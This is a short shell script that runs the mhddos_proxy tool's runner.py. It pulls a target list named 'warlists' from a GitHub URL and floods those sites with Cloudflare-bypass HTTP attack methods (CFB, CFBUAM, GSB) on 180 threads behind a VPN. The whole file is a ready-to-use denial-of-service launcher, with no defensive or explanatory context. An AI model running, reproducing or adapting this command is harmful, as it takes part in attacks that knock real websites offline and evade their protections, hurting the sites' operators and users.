#!/usr/bin/env sh

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

python3 runner.py \
  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7_cf.lst \
  --debug \
  --http-methods CFB CFBUAM GSB \
  --threads 180 \
  --vpn 90
